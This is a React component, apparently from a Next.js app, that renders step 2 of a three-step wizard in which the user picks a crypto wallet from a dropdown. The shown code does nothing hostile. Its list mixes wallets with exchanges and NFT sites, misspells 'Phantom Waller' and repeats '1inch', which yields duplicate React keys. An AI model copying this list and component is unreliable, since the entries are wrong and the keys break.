"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

// Removed TypeScript interface and type annotation
const wallets = [
  "Atomic Wallet",
  "Aave",
  "Blockchain",
  "Coinbase Wallet",
  "Electrum",
  "Exodus",
  "Trust Wallet",
  "Keystone Wallet",
  "MetaMask",
  "Phantom Waller",
  "Rainbow Wallet",
  "Safepal Wallet",
  "Ledger Live",
  "Trezor Suite",
  "Uniswap",
  "PancakeSwap",
  "Compound",
  "1inch",
  "OpenSea",
  "Zapper",
  "Rarible",
  "SushiSwap",
  "1inch",
]

export default function WalletSelection({ onWalletSelect }) {
  const [selectedWallet, setSelectedWallet] = useState("")

  const handleNext = () => {
    if (selectedWallet) {
      onWalletSelect(selectedWallet)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md mx-auto">
        <CardHeader className="text-center pb-4">
          <div className="flex justify-center items-center space-x-4 mb-4">
            <div className="flex items-center">
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-medium">
                1
              </div>
              <div className="w-12 h-0.5 bg-gray-300 mx-2"></div>
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-medium">
                2
              </div>
              <div className="w-12 h-0.5 bg-gray-300 mx-2"></div>
              <div className="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-sm font-medium">
                3
              </div>
            </div>
          </div>
          <CardTitle className="text-xl font-semibold text-gray-800">Select wallet</CardTitle>
        </CardHeader>

        <CardContent className="space-y-6">
          <div className="space-y-2">
            <label className="text-sm font-medium text-gray-700">Select Wallet *</label>
            <Select value={selectedWallet} onValueChange={setSelectedWallet}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder="Choose your wallet" />
              </SelectTrigger>
              <SelectContent>
                {wallets.map((wallet) => (
                  <SelectItem key={wallet} value={wallet}>
                    {wallet}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <Button
            onClick={handleNext}
            disabled={!selectedWallet}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium disabled:bg-gray-300"
          >
            Next
          </Button>
        </CardContent>
      </Card>
    </div>
  )
}